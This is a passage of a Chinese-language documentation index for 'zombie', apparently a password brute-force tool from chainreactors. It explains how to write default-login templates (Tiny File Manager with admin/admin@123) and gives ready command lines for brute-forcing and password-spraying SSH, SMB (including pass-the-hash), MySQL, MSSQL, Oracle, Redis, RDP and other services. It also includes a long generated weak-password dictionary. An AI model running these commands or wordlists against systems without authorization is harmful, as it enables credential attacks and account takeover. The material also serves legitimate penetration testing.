\u4e3a\u4e86\u7f16\u8bd1\u540e\u7684\u6587\u4ef6\u4f53\u79ef\u7740\u60f3), \u5220\u9664\u6389metadata, classification\u7b49\u5185\u5bb9</p> <p>step2 \u6dfb\u52a0\u5173\u952e\u5b57\u6bb5</p> <p>\u4e3a\u4e86\u80fd\u652f\u6301\u4ecegogo\u4e2d\u76f4\u63a5\u5bfc\u5165\u5230zombie, \u56e0\u6b64\u9700\u8981\u7ed1\u5b9agogo\u7684\u6307\u7eb9. \u9700\u8981\u5728\u6307\u7eb9\u4ed3\u5e93\u4e0b\u641c\u7d22\u5bf9\u5e94\u7684\u6307\u7eb9\u540d\u5b57. </p> <p>\u5982\u679ctag\u4e2d\u5df2\u7ecf\u6709\u4e86\u6307\u7eb9\u540d\u5b57. \u8fd9\u4e2a\u6307\u7eb9\u53ef\u4ee5\u4e0d\u505a\u4efb\u4f55\u4fee\u6539\u5c31\u5728neutron\u4e2d\u4f7f\u7528.\u5982\u679c\u6ca1\u6709, \u5219\u9700\u8981\u624b\u52a8\u7ed1\u5b9a\u6307\u7eb9\u540d\u5b57 </p> <pre><code>id: webmin-default-login\nfinger:\n  - Tiny-FileManager\n  - Tiny....\n</code></pre> <p>\u5982\u679c\u6709\u591a\u4e2a\u6307\u7eb9\u90fd\u9700\u8981\u7528\u5230\u8fd9\u4e2atemplate, \u53ef\u4ee5\u540c\u65f6\u7ed1\u5b9a\u591a\u4e2a\u6307\u7eb9. </p> <p>template\u4e2d\u7684finger\u4e0etag\u90fd\u4f1a\u7ed1\u5b9a\u5230\u5bf9\u5e94\u7684\u6307\u7eb9, \u53ea\u9700\u8981\u5b9e\u73b0\u5176\u4e2d\u4e00\u4e2a\u5373\u53ef. </p> <p>\u7ed1\u5b9a\u597d\u6307\u7eb9\u4e4b\u540e, \u8fd8\u9700\u8981\u5728zombie\u4e2d\u6ce8\u518c\u8fd9\u4e2atemplate. </p> <p>\u5728info\u5b57\u6bb5\u4e0b\u9762, \u6dfb\u52a0\u4e00\u4e2azombie\u5b57\u6bb5\u5373\u53ef\u81ea\u52a8\u5728\u52a0\u8f7d\u65f6\u6ce8\u518c. \u4fee\u6539\u5b8c\u7684\u7ed3\u679c\u5982\u4e0b <pre><code>id: tiny-filemanager-default-login\n\ninfo:\n  name: Tiny File Manager - Default Login\n  author: shelled\n  severity: high\n  description: Tiny File Manager contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.\n  tags: tiny\n  zombie: tiny\n</code></pre></p> <p>\u6700\u540e\u8fd8\u6709\u4e00\u4e2a\u5730\u65b9\u9700\u8981\u4fee\u6539, zombie\u5f3a\u5236\u6307\u5b9atemplate\u4e2dpayload\u5b57\u6bb5\u4e2d\u7684<code>username</code>\u4e0e<code>password</code>\u5bf9\u5e94\u5230\u5185\u90e8\u7684\u8d26\u53f7\u5bc6\u7801\u751f\u6210\u5668. </p> <p>\u56e0\u6b64, \u5982\u679ctemplate payloads\u4e2d\u7684\u5b57\u6bb5\u540d\u4e0d\u4e3a<code>username</code> \u4e0e<code>password</code> ,\u5219\u8981\u5c06\u5176\u6539\u6210\u6b63\u786e\u7684\u503c.  </p> <pre><code>http:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n      - |\n        POST / HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n\n        fm_usr={{username}}&amp;fm_pwd={{password}}&amp;token={{token}}\n      - |\n        GET /?p= HTTP/1.1\n        Host: {{Hostname}}\n\n    attack: pitchfork\n    payloads:\n      username:\n        - admin\n      password:\n        - admin@123\n    ...\n</code></pre> <p>\u6682\u65f6\u4e0d\u652f\u6301extractor</p> <p>extractor\u6682\u65f6\u4e0d\u751f\u6548(\u5982\u679c\u4fdd\u7559\u4e86\u4e5f\u4e0d\u4f1a\u62a5\u9519), \u5c06\u4f1a\u5c3d\u5feb\u652f\u6301\u76f8\u5e94\u7684\u529f\u80fd</p> <p>step3 \u6d4b\u8bd5</p> <p>zombie\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2aexample\u7528\u6765\u6d4b\u8bd5template\u662f\u5426\u80fd\u5728neutron\u4e0a\u6b63\u786e\u8fd0\u884c.</p> <p>\u514b\u9686 https://github.com/chainreactors/zombie \u4ed3\u5e93\u540e, \u5728\u4ed3\u5e93\u76ee\u5f55\u4e0b\u8fd0\u884c.</p> <p><code>go run .\\example\\template\\main.go  -i 127.0.0.1 -t tiny-file-manager-default-login.yaml</code></p> <p>(\u6211\u8fd9\u91cc\u4f7f\u7528\u4e86\u4e00\u4e2a\u672c\u5730\u5bb9\u6613\u642d\u5efa\u7684\u670d\u52a1\u8fdb\u884c\u6d4b\u8bd5)</p> <p></p> <p>\u5982\u679c\u6ca1\u6709\u767b\u5f55\u5931\u8d25\u4f1a\u8f93\u51fa<code>no result</code></p> <p>step4 \u63d0\u4ea4</p> <p>zombie\u4f1a\u6bcf\u6b21\u7248\u672c\u66f4\u65b0\u7684\u65f6\u5019\u91cd\u65b0\u6253\u5305template\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d.  \u672c\u5730\u6d4b\u8bd5\u901a\u8fc7\u7684poc\u653e\u5230template/neutron/login \u76ee\u5f55\u4e0b.</p> <p>\u5982\u679c\u662f\u81ea\u884c\u7f16\u8bd1\u4f7f\u7528, \u53c2\u8003README.md\u4e2d\u7684\u7f16\u8bd1\u65b9\u5f0f\u91cd\u65b0\u7f16\u8bd1\u6253\u5305\u5373\u53ef. \u5982\u679c\u60f3\u5728\u4e0b\u4e2a\u7248\u672c\u7684zombie\u4e2d\u89c1\u5230\u81ea\u5df1\u7684poc, \u63d0\u8981\u63d0\u4ea4pr\u5230template\u4ed3\u5e93. </p>"},{"location":"zombie/start/","title":"zombie \u00b7 \u5165\u95e8","text":""},{"location":"zombie/start/#feature","title":"Feature","text":"<p>Feature.</p> <ul> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u6570\u500d\u4e8ehydra</li> <li>\u4fbf\u643a\u4e14\u65e0\u4f9d\u8d56, \u80fd\u5728\u7edd\u5927\u591a\u6570\u573a\u666f\u843d\u5730</li> <li>\u4e30\u5bcc\u7684\u534f\u8bae\u652f\u6301</li> <li>\u4e0egogo\u7684\u5b8c\u7f8e\u8054\u52a8, \u4e00\u952e\u5bf9gogo\u626b\u63cf\u7ed3\u679c\u8fdb\u884c\u7206\u7834</li> <li>\u5b57\u5178\u751f\u6210\u5668, \u6839\u636e\u4e0d\u540c\u573a\u666f\u81ea\u52a8\u751f\u6210\u4e0d\u540c\u5b57\u5178</li> <li>\u591a\u79cd\u4fbf\u6377\u7684\u8f93\u5165\u4e0e\u8f93\u51fa\u65b9\u5f0f</li> </ul>"},{"location":"zombie/start/#usage","title":"Usage","text":"<p><code>zombie -h</code></p> <pre><code>Usage:\n  zombie.exe [OPTIONS]\n\nInput Options:\n  -i, --ip=             String, input ip\n  -I, --IP=             File, input ip list filename\n  -u, --user=           Strings, input usernames\n  -U, --USER=           File, input username list filename\n  -a, --auth=           Strings, input auth, username::password\n  -A, --AUTH=           File, input auth list filename\n      --userrule=       String, input username generator rule filename\n  -p, --pwd=            String, input passwords\n  -P, --PWD=            File, input password list filename\n      --pwdrule=        String, input password generator rule filename\n  -d, --dict=           Strings, input dictionaries\n  -j, --json=           File, input json result filename\n  -g, --gogo=           File, input gogo result filename\n  -s, --service=        String, input service name\n  -S, --filter-service= String, filter service when input json/gogo file\n      --param=          params\n\nOutput Options:\n  -f, --file=           File, output result filename\n  -O, --file-format=    String, output result file format (default: json)\n  -o, --format=         String, output result format (default: string)\n\nWord Options:\n      --top=            Int, top n words (default: 0)\n      --force-continue  Bool, force continue, not only stop when first success ever host\n      --weakpass        Bool, common weak password rule\n      --no-unauth       Bool, skip check unauth\n      --no-honeypot     Bool, skip check honeypot\n\nMisc Options:\n      --raw             Bool, parser raw username/password\n  -t=                   Int, threads (default: 100)\n      --timeout=        Int, timeout (default: 5)\n  -m=                   String, clusterbomb/sniper (default: clusterbomb)\n      --debug           Bool, enable debug\n  -l, --list            Bool, list all service\n      --bar             Bool, enable bar\n      --version         Bool, show version\n\nHelp Options:\n  -h, --help            Show this help message\n</code></pre>"},{"location":"zombie/start/#quickstart","title":"QuickStart","text":"<p>\u53c2\u8003\u4e86 hydra \u7684\u547d\u4ee4\u884c\u8bbe\u8ba1, \u5c0f\u5199\u4e3a\u547d\u4ee4\u884c\u8f93\u51fa, \u5927\u5199\u4e3a\u6587\u4ef6\u8f93\u5165, \u7559\u7a7a\u4e3a\u4f7f\u7528\u9ed8\u8ba4\u503c.</p> <p>\u67e5\u770b\u6240\u6709\u652f\u6301\u7684\u670d\u52a1</p> <p><code>zombie -l</code></p> <p>\u4f7f\u7528\u9ed8\u8ba4\u5b57\u5178\u7206\u7834 ssh \u7684 root \u7528\u6237\u53e3\u4ee4</p> <p><code>zombie -i 1.1.1.1 -u root -s ssh</code></p> <p>\u4f7f\u7528\u6307\u5b9a\u7684\u5bc6\u7801\u6279\u91cf\u55b7\u6d12 ssh \u53e3\u4ee4</p> <p><code>zombie -I targets.txt -u root -p password -s ssh</code></p> <p>targets.txt</p> <pre><code>1.1.1.1\n2.2.2.2\n3.3.3.3\n...\n</code></pre> <p>\u4ece\u6587\u4ef6\u4e2d\u81ea\u52a8\u89e3\u6790\u8f93\u5165</p> <p><code>zombie -I targets.txt</code></p> <p>targets.txt:</p> <pre><code>mysql://user:pass@1.1.1.1:3307  # \u6307\u5b9a\u4e86\u7528\u6237\u4e0e\u5bc6\u7801\u4ee5\u53ca\u7aef\u53e3, \u5c1d\u8bd5\u767b\u5f55mysql\nssh://user@2.2.2.2              # \u81ea\u52a8\u89e3\u6790ssh\u9ed8\u8ba4\u7aef\u53e322, \u4f7f\u7528\u9ed8\u8ba4\u5bc6\u7801\u7206\u7834\u6307\u5b9auser\u7684ssh\nmssql://3.3.3.3:1433            # \u672a\u6307\u5b9auser\u4e0epass, \u81ea\u52a8\u9009\u7528\u9ed8\u8ba4\u7684\u7528\u6237\u4e0e\u5bc6\u7801\u5b57\u5178\n</code></pre> <p>\u4f7f\u7528\u5df2\u77e5\u7684\u6240\u6709\u7528\u6237\u4e0e\u5bc6\u7801, \u8fdb\u884c\u7b1b\u5361\u5c14\u79ef\u7684\u65b9\u5f0f\u5bf9\u670d\u52a1\u8fdb\u884c\u6700\u5927\u53ef\u80fd\u7684\u7206\u7834.</p> <p><code>zombie -I targets.txt -U user.txt -P pass.txt</code></p> <p>targets.txt:</p> <pre><code>mysql://1.1.1.1\nssh://2.2.2.2\nmssql://3.3.3.3\n</code></pre> <p>\u4ece gogo \u7ed3\u679c\u5f00\u59cb\u626b\u63cf</p> <p><code>zombie --gogo 1.dat</code></p> <p>\u4ece json \u5f00\u59cb\u626b\u63cf</p> <p><code>zombie -j 1.json</code></p> <p>\u7b80\u5355\u914d\u7f6e\u81ea\u5b9a\u4e49\u5bc6\u7801\u751f\u6210\u5668</p> <p><code>zombie -l 1.txt -p admin --weakpass</code></p> <p>\u5c06\u4f1a\u6839\u636e google \u5173\u952e\u5b57\u751f\u6210\u5e38\u89c1\u7684\u5bc6\u7801\u7ec4\u5408, \u4ee5 admin \u4e3a\u4f8b\uff0c \u5c06\u4f1a\u751f\u6210\u4ee5\u4e0b\u5bc6\u7801</p> --weakpass \u751f\u6210\u7684\u5bc6\u7801 <pre><code>admin\nAdmin\nADMIN\naDMIN\nadmin1\nadmin2\nadmin3\nadmin4\nadmin5\nadmin6\nadmin7\nadmin8\nadmin9\nadmin0\nadmin123\nadmin1234\nadmin12345\nadmin123456\nadmin2018\nadmin2019\nadmin2020\nadmin2021\nadmin2022\nadmin01\nadmin02\nadmin03\nadmin04\nadmin05\nadmin06\nadmin07\nadmin08\nadmin09\nadmin10\nadmin11\nadmin12\nadmin13\nadmin14\nadmin15\nadmin16\nadmin17\nadmin18\nadmin19\nadmin20\nadmin21\nadmin22\nadmin23\nadmin24\nadmin25\nadmin26\nadmin27\nadmin28\nadmin29\nadmin30\nadmin31\nadmin!\nadmin@\nadmin#\nadmin$\nadmin!@\nadmin!@#\nadmin!@#$\nadmin123!\nadmin!123\nadmin1@\nadmin2018!\nadmin2019!\nadmin2020!\nadmin2021!\nadmin2022!\nadmin!2018\nadmin!2019\nadmin!2020\nadmin!2021\nadmin!2022\nadmin2018!@#\nadmin2019!@#\nadmin2020!@#\nadmin2021!@#\nadmin2022!@#\nadmin01!\nadmin02!\nadmin03!\nadmin04!\nadmin05!\nadmin06!\nadmin07!\nadmin08!\nadmin09!\nadmin10!\nadmin11!\nadmin12!\nadmin13!\nadmin14!\nadmin15!\nadmin16!\nadmin17!\nadmin18!\nadmin19!\nadmin20!\nadmin21!\nadmin22!\nadmin23!\nadmin24!\nadmin25!\nadmin26!\nadmin27!\nadmin28!\nadmin29!\nadmin30!\nadmin31!\nAdmin1\nAdmin2\nAdmin3\nAdmin4\nAdmin5\nAdmin6\nAdmin7\nAdmin8\nAdmin9\nAdmin0\nAdmin123\nAdmin1234\nAdmin12345\nAdmin123456\nAdmin2018\nAdmin2019\nAdmin2020\nAdmin2021\nAdmin2022\nAdmin!\nAdmin@\nAdmin#\nAdmin$\nAdmin!@\nAdmin!@#\nAdmin!@#$\nAdmin123!\nAdmin!123\nAdmin1@\nAdmin2018!\nAdmin2019!\nAdmin2020!\nAdmin2021!\nAdmin2022!\nAdmin!2018\nAdmin!2019\nAdmin!2020\nAdmin!2021\nAdmin!2022\nAdmin2018!@#\nAdmin2019!@#\nAdmin2020!@#\nAdmin2021!@#\nAdmin2022!@#\nAdmin01!\nAdmin02!\nAdmin03!\nAdmin04!\nAdmin05!\nAdmin06!\nAdmin07!\nAdmin08!\nAdmin09!\nAdmin10!\nAdmin11!\nAdmin12!\nAdmin13!\nAdmin14!\nAdmin15!\nAdmin16!\nAdmin17!\nAdmin18!\nAdmin19!\nAdmin20!\nAdmin21!\nAdmin22!\nAdmin23!\nAdmin24!\nAdmin25!\nAdmin26!\nAdmin27!\nAdmin28!\nAdmin29!\nAdmin30!\nAdmin31!\nAdmin01\nAdmin02\nAdmin03\nAdmin04\nAdmin05\nAdmin06\nAdmin07\nAdmin08\nAdmin09\nAdmin10\nAdmin11\nAdmin12\nAdmin13\nAdmin14\nAdmin15\nAdmin16\nAdmin17\nAdmin18\nAdmin19\nAdmin20\nAdmin21\nAdmin22\nAdmin23\nAdmin24\nAdmin25\nAdmin26\nAdmin27\nAdmin28\nAdmin29\nAdmin30\nAdmin31\n</code></pre> <p><code>--weakpass</code>\u7684\u89c4\u5219\u4f4d\u4e8e https://github.com/chainreactors/templates/blob/master/zombie/rule/weakpass.rule , \u6b22\u8fce\u63d0\u4f9b\u65b0\u89c4\u5219</p> <p>\u7b49\u4ef7\u4e8e</p> <p><code>zombie -l 1.txt -p admin --pwdrule weakpass.rule</code></p>"},{"location":"zombie/start/#advance-usage","title":"Advance Usage","text":""},{"location":"zombie/start/#\u7206\u7834\u6a21\u5f0f","title":"\u7206\u7834\u6a21\u5f0f","text":"<p>ClusterBomb (\u9ed8\u8ba4\u542f\u7528)</p> <p>\u4f1a\u81ea\u52a8\u586b\u5145\u9ed8\u8ba4\u7684\u8d26\u53f7\u5bc6\u7801\u5b57\u5178, \u5e76\u8fdb\u884c honeypot \u7684\u68c0\u67e5, \u901a\u8fc7\u540e\u4f1a\u5bf9\u6bcf\u4e2a\u7528\u6237\u90fd\u8fdb\u884c unauth \u68c0\u67e5, \u901a\u8fc7\u540e\u624d\u4f1a\u8fdb\u884c\u7206\u7834, \u5e76\u53ea\u7206\u7834\u51fa\u4efb\u610f\u4e00\u4e2a\u8d26\u53f7\u5bc6\u7801\u5373\u505c\u6b62, \u9002\u7528\u4e8e\u5927\u591a\u6570\u573a\u666f</p> <p>\u53ef\u901a\u8fc7\u53c2\u6570<code>--no-unauth</code> \u4e0e <code>--no-check-honeypot</code> \u5173\u95ed\u5bf9\u5e94\u7684\u68c0\u67e5\u9636\u6bb5.</p> <p>Sniper</p> <p>\u9700\u8981<code>-m sniper</code> \u542f\u7528 sniper \u6a21\u5f0f</p> <p>\u53ea\u4f1a\u7206\u7834\u8f93\u5165\u7684\u6bcf\u4e2a\u76ee\u6807, \u4e0d\u4f1a\u81ea\u52a8\u9009\u62e9\u5b57\u5178, \u4e5f\u4e0d\u4f1a\u8fdb\u884c unauth \u4e0e honeypot \u68c0\u67e5, \u9002\u7528\u4e8e\u5df2\u77e5\u5bc6\u7801\u8fdb\u884c\u6279\u91cf\u6d4b\u8bd5\u7684\u573a\u666f</p>"},{"location":"zombie/start/#\u5bc6\u7801\u751f\u6210\u5668","title":"\u5bc6\u7801\u751f\u6210\u5668","text":"<p>\u5bc6\u7801\u751f\u6210\u5668\u662f zombie \u6700\u6838\u5fc3\u7684\u7279\u70b9, \u901a\u8fc7\u5bc6\u7801\u751f\u6210\u5668, \u53ef\u4ee5\u6839\u636e\u573a\u666f\u5b9a\u5236\u7206\u7834\u9700\u6c42, \u6781\u5927\u589e\u5927\u7206\u7834\u6210\u529f\u7387.</p> <p>words \u9879\u76ee\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bc6\u7801\u751f\u6210\u5668, \u4e00\u79cd\u662f\u57fa\u4e8e\u63a9\u7801\u7684\u751f\u6210\u5668, \u4e00\u79cd\u662f\u57fa\u4e8e\u89c4\u5219\u7684\u751f\u6210\u5668. \u751f\u6210\u5668\u7684\u7528\u6cd5\u8bf7\u89c1 words \u6587\u6863</p> <p>\u57fa\u4e8e\u89c4\u5219\u751f\u6210</p> <p><code>zombie -i ssh://123.123.123.123 -u root -p root --pwdrule rockyou30000.rule</code></p> <p>\u7206\u7834 123.123.123.123 \u7684 ssh \u670d\u52a1, \u4f7f\u7528 rockyou30000 \u7684\u89c4\u5219\u5e93\u57fa\u4e8e root \u751f\u6210 30000 \u4e2a\u5bc6\u7801\u5b57\u5178</p> <p>\u540c\u7406, \u53ef\u4e3a user \u751f\u6210\u7528\u6237\u540d</p> <p><code>zombie -i ssh://123.123.123.123 -u root --userrule user.rule -p root --pwdrule weakpass.rule</code></p> <p>\u6ce8\u610f</p> <p>\u5bc6\u7801\u751f\u6210\u5668\u751f\u6210\u540e\u7684\u5b57\u5178\u5927\u5c0f\u53ef\u80fd\u8d85\u8fc7\u9884\u671f</p>"},{"location":"zombie/start/#\u670d\u52a1\u7206\u7834","title":"\u670d\u52a1\u7206\u7834","text":"<p>\u901a\u8fc7<code>--params</code> \u53ef\u63a7\u5236\u4e00\u4e9b\u7279\u6b8a\u7684\u53c2\u6570\u4e0e\u7206\u7834\u6a21\u5f0f, \u5177\u4f53\u8bf7\u89c1\u6bcf\u4e2a plugin \u4e2d\u7684\u7528\u4f8b</p>"},{"location":"zombie/start/#ssh","title":"SSH","text":"<p>\u7206\u7834 ssh \u5bc6\u7801</p> <p><code>zombie -s ssh -I ip.txt -u root -P pwd.txt</code></p> <p>\u901a\u8fc7\u8bc1\u4e66\u6279\u91cf\u5c1d\u8bd5\u767b\u5f55</p> <p><code>zombie -s ssh -I ip.txt -p pk:root.pem</code></p>"},{"location":"zombie/start/#smb","title":"SMB","text":"<p>\u7206\u7834 SMB \u5bc6\u7801</p> <p><code>zombie -s smb -I ip.txt -u administrator -P pwd.txt</code></p> <p>\u4f7f\u7528 hash \u6279\u91cf\u7206\u7834</p> <p><code>zombie -s smb -I ip.txt -p hash:aad3c435b514a4eeaad3b935b51304fe</code></p>"},{"location":"zombie/start/#http-auth","title":"HTTP Auth","text":"<p>\u7206\u7834 HTTP Auth</p> <p><code>zombie -s http -I ip.txt -u admin -P pwd.txt</code></p> <p>\u5e26\u8def\u7531\u7684 auth \u8ba4\u8bc1</p> <p><code>zombie -s http -I ip.txt -u admin -P pwd.txt --param path:admin.php</code></p> <p>Tomcat \u7206\u7834, \u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u7684\u8d26\u53f7\u4e0e\u5bc6\u7801\u5b57\u5178, \u662f 401 \u573a\u666f\u7684\u7279\u6b8a\u4f18\u5316, \u7b80\u5316\u64cd\u4f5c</p> <p><code>zombie -s tomcat -I ip.txt</code></p> <p>Kibana \u7206\u7834, \u4e0e tomcat \u7c7b\u4f3c, \u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u7684\u8d26\u53f7\u5bc6\u7801\u5b57\u5178, \u7b80\u5316\u64cd\u4f5c</p> <p><code>zombie -s kibana -I ip.txt</code></p>"},{"location":"zombie/start/#mysql","title":"MySQL","text":"<p>\u7206\u7834 MySQL \u5bc6\u7801</p> <p><code>zombie -s mysql -I ip.txt -u root -P pwd.txt</code></p>"},{"location":"zombie/start/#mssql","title":"MSSQL","text":"<p>\u7206\u7834 MSSQL \u5bc6\u7801</p> <p><code>zombie -s mssql -I ip.txt -u sa -P pwd.txt</code></p> <p>\u6307\u5b9a instance</p> <p><code>zombie -s mssql -I ip.txt -u sa -P pwd.txt --param instance:SQLEXPRESS</code></p>"},{"location":"zombie/start/#oracle-warnning-\u672a\u7ecf\u8fc7\u5145\u5206\u6d4b\u8bd5","title":"Oracle (WARNNING \u672a\u7ecf\u8fc7\u5145\u5206\u6d4b\u8bd5)","text":"<p>\u7206\u7834 Oracle \u5bc6\u7801</p> <p><code>zombie -s oracle -I ip.txt -u system -P pwd.txt</code></p> <p>\u6307\u5b9a sid</p> <p><code>zombie -s oracle -I ip.txt -u system -P pwd.txt --param sid:orcl</code></p> <p>\u6307\u5b9a service name</p> <p><code>zombie -s oracle -I ip.txt -u system -P pwd.txt --param service_name:orcl</code></p>"},{"location":"zombie/start/#mongodb","title":"MongoDB","text":"<p>\u7206\u7834 MongoDB \u5bc6\u7801</p> <p><code>zombie -s mongodb -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#postgre","title":"Postgre","text":"<p>\u7206\u7834 Postgre \u5bc6\u7801</p> <p><code>zombie -s postgre -I ip.txt -u postgres -P pwd.txt</code></p> <p>\u6307\u5b9a dbname</p> <p><code>zombie -s postgre -I ip.txt -u postgres -P pwd.txt --param dbname:postgres</code></p>"},{"location":"zombie/start/#redis","title":"Redis","text":"<p>(redis \u4e0d\u9700\u8981\u8bbe\u7f6e user)</p> <p>\u7206\u7834 Redis \u5bc6\u7801</p> <p><code>zombie -s redis -I ip.txt -P pwd.txt</code></p>"},{"location":"zombie/start/#ftp","title":"FTP","text":"<p>\u7206\u7834 FTP \u5bc6\u7801</p> <p><code>zombie -s ftp -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#smtp","title":"SMTP","text":"<p>\u7206\u7834 SMTP \u5bc6\u7801</p> <p><code>zombie -s smtp -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#pop3","title":"POP3","text":"<p>\u7206\u7834 POP3 \u5bc6\u7801</p> <p><code>zombie -s pop3 -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#ldap","title":"LDAP","text":"<p>\u7206\u7834 LDAP \u5bc6\u7801</p> <p><code>zombie -s ldap -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#telnet-warnning-\u672a\u7ecf\u8fc7\u5145\u5206\u6d4b\u8bd5-warnning-\u4e0d\u652f\u6301\u5168\u90e8\u7248\u672c","title":"Telnet (WARNNING \u672a\u7ecf\u8fc7\u5145\u5206\u6d4b\u8bd5) (WARNNING \u4e0d\u652f\u6301\u5168\u90e8\u7248\u672c)","text":"<p>\u6709\u5931\u8d25\u7684\u60c5\u51b5\u8bf7\u63d0\u4f9b issue</p> <p>\u7206\u7834 Telnet \u5bc6\u7801</p> <p><code>zombie -s telnet -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#vnc","title":"VNC","text":"<p>\u7206\u7834 VNC \u5bc6\u7801</p> <p><code>zombie -s vnc -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"zombie/start/#rdp","title":"RDP","text":"<p>\u7206\u7834 RDP \u5bc6\u7801</p> <p><code>zombie -s rdp -I ip.txt -u admin -P pwd.txt</code></p>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/archive/2023/","title":"2023","text":""},{"location":"blog/archive/2022/","title":"2022","text":""},{"location":"blog/page/2/","title":"Blog","text":""}]}